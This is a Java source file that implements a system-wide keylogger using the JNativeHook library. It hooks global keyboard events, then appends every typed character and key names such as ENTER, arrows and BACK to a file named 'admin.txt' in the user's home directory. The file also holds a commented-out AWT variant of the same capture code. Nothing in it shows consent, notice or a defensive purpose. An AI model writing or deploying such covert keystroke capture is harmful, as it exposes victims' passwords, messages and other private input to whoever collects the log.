package back;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

//import java.awt.KeyboardFocusManager;
//import java.awt.KeyEventDispatcher;
//import java.awt.event.KeyListener;
//import java.awt.event.KeyEvent;
import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
//import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import java.io.*;
import java.nio.charset.StandardCharsets;

public class FunctionsK implements NativeKeyListener {

    String rutaHome = System.getProperty("user.home");
    String separador = File.separator;

    public FunctionsK() {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            System.err.println("Error: " + ex.getMessage());
        }
        GlobalScreen.addNativeKeyListener(this);
    }
        /*KeyboardFocusManager.getCurrentKeyboardFocusManager().addKeyEventDispatcher(new KeyEventDispatcher() {
            @Override
            public boolean dispatchKeyEvent(KeyEvent e) {
                if (e.getID() == KeyEvent.KEY_PRESSED) {//(Flechas, Enter, Space), usamos KEY_PRESSED
                    int code = e.getKeyCode();
                    if (code == KeyEvent.VK_SPACE || code == KeyEvent.VK_ENTER ||
                            code == KeyEvent.VK_DOWN || code == KeyEvent.VK_UP ||
                            code == KeyEvent.VK_LEFT || code == KeyEvent.VK_RIGHT) {
                        keyPressed(e);
                    }
                }
                else if (e.getID() == KeyEvent.KEY_TYPED) {//LETRA o NÚMERO (incluye tildes), usamos KEY_TYPED
                    char c = e.getKeyChar();
                    if (c != ' ' && c != '\n' && c != '\r') {
                        keyPressed(e);
                    }
                }
                return false

                        ;
            }}); ESTE TROZO FUE CREADO SIN IMPORTAR NADA
    }

    @Override
    public void keyPressed(KeyEvent keyEvent) {
        char c =  keyEvent.getKeyChar();//Usado en el else final
        if (keyEvent.getKeyCode() == KeyEvent.VK_SPACE) {
            try {
                FileWriter fw = new FileWriter(rutaHome + separador + "admin.txt", true);
                fw.write(" SPACE ");;
                fw.close();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }else if (keyEvent.getKeyCode() == KeyEvent.VK_ENTER) {
            try {
                FileWriter fw = new FileWriter(rutaHome + separador + "admin.txt", true);
                fw.write(" ENTER");;
                fw.close();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }else if (keyEvent.getKeyCode() == KeyEvent.VK_DOWN) {
            try {
                FileWriter fw = new FileWriter(rutaHome + separador + "admin.txt", true);
                fw.write(" ARROW DOWN ");;
                fw.close();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }else if (keyEvent.getKeyCode() == KeyEvent.VK_UP) {
            try {
                FileWriter fw = new FileWriter(rutaHome + separador + "admin.txt", true);
                fw.write(" ARROW UP");;
                fw.close();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }else if (keyEvent.getKeyCode() == KeyEvent.VK_LEFT) {
            try {
                FileWriter fw = new FileWriter(rutaHome + separador + "admin.txt", true);
                fw.write(" ARROW LEFT ");;
                fw.close();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }else if (keyEvent.getKeyCode() == KeyEvent.VK_RIGHT) {
            try {
                FileWriter fw = new FileWriter(rutaHome + separador + "admin.txt", true);
                fw.write(" ARROW RIGHT ");;
                fw.close();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }else{
            try {
                FileOutputStream fos = new FileOutputStream(rutaHome + separador + "admin.txt", true);
                OutputStreamWriter osw = new OutputStreamWriter(fos, StandardCharsets.UTF_8);
                char tecla = keyEvent.getKeyChar();
                if (tecla != KeyEvent.CHAR_UNDEFINED) {
                    osw.write(tecla);
                    }
                osw.close();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }
    }*/

    @Override
    public void nativeKeyPressed(NativeKeyEvent keyEvent) {

        int codigo = keyEvent.getKeyCode();

        if (codigo == NativeKeyEvent.VC_SPACE) {
            try {
                FileWriter fw = new FileWriter(rutaHome + separador + "admin.txt", true);
                fw.write(" ");
                fw.close();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        } else if (codigo == NativeKeyEvent.VC_ENTER) {
            try {
                FileWriter fw = new FileWriter(rutaHome + separador + "admin.txt", true);
                fw.write(" ENTER ");
                fw.close();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        } else if (codigo == NativeKeyEvent.VC_DOWN) {
            try {
                FileWriter fw = new FileWriter(rutaHome + separador + "admin.txt", true);
                fw.write(" ARROW DOWN ");
                fw.close();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        } else if (codigo == NativeKeyEvent.VC_UP) {
            try {
                FileWriter fw = new FileWriter(rutaHome + separador + "admin.txt", true);
                fw.write(" ARROW UP ");
                fw.close();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        } else if (codigo == NativeKeyEvent.VC_LEFT) {
            try {
                FileWriter fw = new FileWriter(rutaHome + separador + "admin.txt", true);
                fw.write(" ARROW LEFT ");
                fw.close();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        } else if (codigo == NativeKeyEvent.VC_RIGHT) {
            try {
                FileWriter fw = new FileWriter(rutaHome + separador + "admin.txt", true);
                fw.write(" ARROW RIGHT ");
                fw.close();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        } else if (codigo == NativeKeyEvent.VC_BACKSPACE){
            try {
                FileWriter fw = new FileWriter(rutaHome + separador + "admin.txt", true);
                fw.write(" BACK ");
                fw.close();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }
        /*else {
            try {
                FileOutputStream fos = new FileOutputStream(rutaHome + separador + "admin.txt", true);
                OutputStreamWriter osw = new OutputStreamWriter(fos, StandardCharsets.UTF_8);
                osw.write(NativeKeyEvent.getKeyText(keyEvent.getKeyCode()));
                osw.close();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }

        }*/
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent keyEvent) {
        char c = keyEvent.getKeyChar();

        if (c == ' ') {
            return;
        }
        if (Character.isLetterOrDigit(c)){
            escribirArchivo(String.valueOf(c));
        } else if (c != NativeKeyEvent.CHAR_UNDEFINED && c >= 32) {
            escribirArchivo(String.valueOf(c));
        }
    }

    private void escribirArchivo(String texto) {
        try (FileOutputStream fos = new FileOutputStream(rutaHome + separador + "admin.txt", true);
             OutputStreamWriter osw = new OutputStreamWriter(fos, StandardCharsets.UTF_8)) {
            osw.write(texto);
        } catch (IOException e) {
            System.err.println("3301 was never solved. " + e.getMessage());
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent KeyEvent) {

    }
}